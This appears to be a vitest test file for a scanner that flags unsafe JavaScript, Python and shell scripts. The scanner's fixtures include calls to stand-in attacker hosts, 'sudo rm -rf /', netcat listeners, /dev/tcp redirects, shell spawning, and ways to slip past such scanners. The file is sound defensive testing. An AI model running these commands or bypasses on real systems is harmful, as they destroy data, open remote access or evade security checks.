import { describe, it, expect } from "vitest";
import { scanScriptSafety } from "./behavioral.js";

describe("Script Behavioral Scanner", () => {
  describe("JavaScript/TypeScript AST Scanner (.js, .ts)", () => {
    it("should pass standard safe script files", () => {
      const code = "console.log('Hello, world!');";
      const result = scanScriptSafety("helper.js", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("should fail JS scripts that reference forbidden identifier eval", () => {
      const code = "const result = eval('2 + 2');";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("eval"))).toBe(true);
    });

    it("should fail JS scripts that reference forbidden identifier fetch", () => {
      const code = "fetch('https://malicious.com');";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("fetch"))).toBe(true);
    });

    it("should fail JS scripts that reference forbidden identifier Function", () => {
      const code = "const fn = new Function('return 1');";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("Function"))).toBe(true);
    });

    it("should fail JS scripts importing child_process modules via require", () => {
      const code = "const { execSync } = require('child_process'); execSync('id');";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("child_process"))).toBe(true);
    });

    it("should fail JS scripts importing other forbidden modules via require", () => {
      const forbidden = ["net", "http", "https", "dgram"];
      for (const mod of forbidden) {
        const code = `const mod = require('${mod}');`;
        const result = scanScriptSafety("script.ts", code);
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.message.includes(mod))).toBe(true);
      }
    });

    it("should fail JS scripts importing forbidden modules via static ES import", () => {
      const code = "import * as cp from 'child_process'; console.log(cp);";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("child_process"))).toBe(true);
    });

    it("should fail JS scripts importing forbidden modules via dynamic ES import", () => {
      const code = "const cpPromise = import('child_process');";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("child_process"))).toBe(true);
    });

    it("should handle AST syntax errors gracefully", () => {
      const code = "const a = ;";
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("Syntax"))).toBe(true);
    });
  });

  describe("Python Heuristics Scanner (.py)", () => {
    const pyViolations = [
      { code: "import subprocess", keyword: "subprocess" },
      { code: "import urllib.request", keyword: "urllib" },
      { code: "import requests", keyword: "requests" },
      { code: "import socket", keyword: "socket" },
      { code: "os.system('id')", keyword: "os.system(" },
      { code: "os.popen('id')", keyword: "os.popen(" },
      { code: "eval('2+2')", keyword: "eval(" },
      { code: "exec('print(1)')", keyword: "exec(" },
      { code: "pty.spawn('/bin/sh')", keyword: "pty.spawn(" }
    ];

    pyViolations.forEach(({ code, keyword }) => {
      it(`should flag Python script attempting to use ${keyword}`, () => {
        const result = scanScriptSafety("script.py", code);
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.message.includes(keyword))).toBe(true);
      });
    });

    it("should pass safe Python code", () => {
      const code = "print('Hello world!')\nmath.cos(1.0)";
      const result = scanScriptSafety("script.py", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe("Shell Heuristics Scanner (.sh)", () => {
    const shViolations = [
      { code: "curl http://attacker.com", keyword: "curl" },
      { code: "wget http://attacker.com", keyword: "wget" },
      { code: "nc -l 4444", keyword: "nc" },
      { code: "netcat -l 4444", keyword: "netcat" },
      { code: "telnet attacker.com", keyword: "telnet" },
      { code: "ssh user@attacker.com", keyword: "ssh" },
      { code: "sh -c 'id'", keyword: "sh -c" },
      { code: "bash -c 'id'", keyword: "bash -c" },
      { code: "/bin/sh -c 'id'", keyword: "/bin/sh" },
      { code: "/bin/bash -c 'id'", keyword: "/bin/bash" },
      { code: "sudo rm -rf /", keyword: "sudo" },
      { code: "su - root", keyword: "su" },
      { code: "echo hello > /dev/tcp/127.0.0.1/80", keyword: "/dev/tcp" },
      { code: "echo hello > /dev/udp/127.0.0.1/80", keyword: "/dev/udp" }
    ];

    shViolations.forEach(({ code, keyword }) => {
      it(`should flag shell script attempting to use ${keyword}`, () => {
        const result = scanScriptSafety("script.sh", code);
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.message.includes(keyword))).toBe(true);
      });
    });

    it("should pass safe shell code", () => {
      const code = "#!/bin/sh\necho \"Starting build...\"\nmkdir -p dist\ncp src/index.js dist/index.js";
      const result = scanScriptSafety("script.sh", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe("Code Quality Reviewer Enhancements", () => {
    it("should parse TypeScript with actual type annotations successfully and validate it", () => {
      const tsCode = `
        interface Config {
          name: string;
        }
        function test<T>(val: T): Config {
          console.log(val);
          return { name: "test" };
        }
        const malicious = eval("2+2");
      `;
      const result = scanScriptSafety("script.ts", tsCode);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.message.includes("eval"))).toBe(true);
    });

    it("should block template literal bypass in require and import", () => {
      const cjsCode = "const cp = require(`child_process`);";
      const result1 = scanScriptSafety("script.js", cjsCode);
      expect(result1.valid).toBe(false);
      expect(result1.errors.some(e => e.message.includes("child_process"))).toBe(true);

      const esmCode = "const cpPromise = import(`child_process`);";
      const result2 = scanScriptSafety("script.js", esmCode);
      expect(result2.valid).toBe(false);
      expect(result2.errors.some(e => e.message.includes("child_process"))).toBe(true);
    });

    it("should not flag fetch/eval/Function when used as keys, properties, or parameters", () => {
      const code = `
        const obj = { fetch: "value", eval: 123 };
        obj.fetch = "new value";
        obj.eval = 456;
        function myFunc(fetch, Function) {
          // empty
        }
        const { fetch: customFetch } = obj;
        class A {
          Function() { return 1; }
        }
      `;
      const result = scanScriptSafety("script.js", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("should support uppercase extensions and extensionless scripts with shebangs", () => {
      // Uppercase extension
      const result1 = scanScriptSafety("script.SH", "curl http://attacker.com");
      expect(result1.valid).toBe(false);

      // Extensionless shell script with shebang
      const result2 = scanScriptSafety("my-runbook", "#!/bin/bash\ncurl http://attacker.com");
      expect(result2.valid).toBe(false);

      // Extensionless python script with shebang
      const result3 = scanScriptSafety("my-python-tool", "#!/usr/bin/env python3\nimport subprocess");
      expect(result3.valid).toBe(false);
    });

    it("should not trigger Python heuristic alerts on commented-out code", () => {
      const code = `
        # import subprocess
        # import urllib
        # import requests
        # import socket
        # os.system('id')
        # os.popen('id')
        # eval('2+2')
        # exec('1')
        # pty.spawn('sh')
        print("Hello")
      `;
      const result = scanScriptSafety("script.py", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
    it("should successfully parse and scan TSX, JSX, MJS, and CJS scripts", () => {
      // TSX file with generic component syntax and fetch
      const tsxCode = `
        const MyComponent = <T,>(props: { val: T }) => {
          fetch("http://leak.com");
          return <div>{props.val}</div>;
        };
      `;
      const resultTsx = scanScriptSafety("component.tsx", tsxCode);
      expect(resultTsx.valid).toBe(false);
      expect(resultTsx.errors.some(e => e.message.includes("fetch"))).toBe(true);

      // JSX file with fetch
      const jsxCode = "const el = <div onClick={() => fetch('leak')} />;";
      const resultJsx = scanScriptSafety("component.jsx", jsxCode);
      expect(resultJsx.valid).toBe(false);
      expect(resultJsx.errors.some(e => e.message.includes("fetch"))).toBe(true);

      // MJS file with ES dynamic import of child_process
      const mjsCode = "import('child_process');";
      const resultMjs = scanScriptSafety("module.mjs", mjsCode);
      expect(resultMjs.valid).toBe(false);
      expect(resultMjs.errors.some(e => e.message.includes("child_process"))).toBe(true);

      // CJS file with require child_process
      const cjsCode = "require('child_process');";
      const resultCjs = scanScriptSafety("module.cjs", cjsCode);
      expect(resultCjs.valid).toBe(false);
      expect(resultCjs.errors.some(e => e.message.includes("child_process"))).toBe(true);
    });

    it("should not bypass scanner when hash symbols are used in strings or parameter expansions", () => {
      // Shell scripts with parameter expansion `$#` and quoted `#`
      const shCode1 = `
        #!/bin/bash
        if [ $# -gt 0 ]; then
          curl http://attacker.com
        fi
      `;
      const resultSh1 = scanScriptSafety("script.sh", shCode1);
      expect(resultSh1.valid).toBe(false);
      expect(resultSh1.errors.some(e => e.message.includes("curl"))).toBe(true);

      const shCode2 = `
        #!/bin/bash
        url="http://attacker.com/#curl"
        wget "$url"
      `;
      const resultSh2 = scanScriptSafety("script.sh", shCode2);
      expect(resultSh2.valid).toBe(false);
      expect(resultSh2.errors.some(e => e.message.includes("wget"))).toBe(true);

      const shCode3 = `
        #!/bin/bash
        length=\${#myvar}
        nc -l 4444
      `;
      const resultSh3 = scanScriptSafety("script.sh", shCode3);
      expect(resultSh3.valid).toBe(false);
      expect(resultSh3.errors.some(e => e.message.includes("nc"))).toBe(true);

      // Python script with literal `#` inside quoted strings
      const pyCode = `
        url = "https://example.com/#ref"
        import subprocess
      `;
      const resultPy = scanScriptSafety("script.py", pyCode);
      expect(resultPy.valid).toBe(false);
      expect(resultPy.errors.some(e => e.message.includes("subprocess"))).toBe(true);
    });
    it("should strip comments in shell scripts and ignore ssh or sudo keywords inside them", () => {
      const code = `
        #!/bin/bash
        # ssh to remote host and download update
        # sudo apt-get update
        echo "Safe operations..."
      `;
      const result = scanScriptSafety("script.sh", code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    describe("Bypass Verification Tests", () => {
      it("globalThis/window member access bypasses", () => {
        const code1 = "globalThis.eval('2+2');";
        const result1 = scanScriptSafety("script.js", code1);
        expect(result1.valid).toBe(false);
        expect(result1.errors.some(e => e.message.includes("eval"))).toBe(true);

        const code2 = "window.fetch('http://malicious.com');";
        const result2 = scanScriptSafety("script.js", code2);
        expect(result2.valid).toBe(false);
        expect(result2.errors.some(e => e.message.includes("fetch"))).toBe(true);

        const code3 = "globalThis['eval']('2+2');";
        const result3 = scanScriptSafety("script.js", code3);
        expect(result3.valid).toBe(false);
        expect(result3.errors.some(e => e.message.includes("eval"))).toBe(true);
      });

      it("indirect require bypasses", () => {
        const code = "const r = require; r('child_process');";
        const result = scanScriptSafety("script.js", code);
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.message.includes("require"))).toBe(true);
      });

      it("shell base representation comment truncation bypasses", () => {
        const code = "echo $((2#1010)) ; curl http://attacker.com";
        const result = scanScriptSafety("script.sh", code);
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.message.includes("curl"))).toBe(true);
      });
    });
  });
});
